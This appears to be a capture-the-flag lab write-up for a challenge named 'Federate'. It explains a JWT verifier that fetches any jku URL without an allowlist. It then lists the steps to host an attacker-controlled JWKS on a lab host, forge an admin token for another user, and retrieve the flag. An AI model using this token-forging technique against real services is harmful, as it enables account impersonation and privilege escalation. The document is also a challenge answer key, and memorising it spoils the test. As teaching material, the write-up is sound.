# JWT / JkuBypass — Federate

Bug: the verifier reads the token header's **`jku` claim** and fetches whatever
URL it names to obtain the JWKS signing key — **no allowlist**. Key control
moves to whoever the token points at.

Why exploitable: the exploit server (`attacker.target.lab:8119`) hosts player
content — store your own JWKS there (`PUT /pages/keys.json`), embed your own
RSA public JWK, and sign tokens with your private key.

Intended path:
1. `POST /login {"username":"0xnhsec","password":"vlh-tester-01"}` → RS256 token (its header shows the jku pattern).
2. Generate an RSA keypair; build `{"keys":[{kty,n,e,kid,alg:"RS256",use:"sig"}]}`.
3. Host it: `PUT http://attacker.target.lab:8119/pages/keys.json` with that JSON.
4. `GET /api/directory` → find the innocent account (`usr_…`, role `innocent`).
5. Forge `{"alg":"RS256","kid":"<yours>","jku":"http://attacker.target.lab:8119/pages/keys.json"}` /
   `{"sub":"usr_…","role":"admin"}`, signed with **your** private key.
6. `GET /flag/jwt` with `Authorization: Bearer <forged>` →
   `DSLTV{JWT-JkuBypass-<n>}` (server fetches YOUR key set, verifies, checks claims).

Flag format: `DSLTV{JWT-JkuBypass-<digits>}` — regenerated at every boot.
